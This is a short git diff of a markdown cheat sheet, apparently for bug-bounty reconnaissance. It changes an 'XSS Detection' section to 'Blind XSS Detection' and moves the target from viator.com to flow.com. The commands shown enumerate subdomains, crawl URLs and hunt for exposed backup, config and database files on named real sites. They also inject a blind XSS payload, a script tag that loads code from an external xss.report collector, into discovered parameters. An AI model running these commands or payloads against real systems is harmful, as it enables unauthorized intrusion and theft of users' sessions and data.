@@ -40,11 +40,11 @@ echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/asshu/nucle
 dirsearch -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json
 ```
 
-## XSS Detection
+## Blind XSS Detection
 
 ```bash
-# Detect XSS vulnerabilities with a payload
-subfinder -d viator.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aswin></script>' -parameters
+# Detect blind XSS vulnerabilities with a payload
+ subfinder -d flow.com | httpx-toolkit --silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/aswin></script>' -parameters
 ```
 
 ## Subdomain Takeover
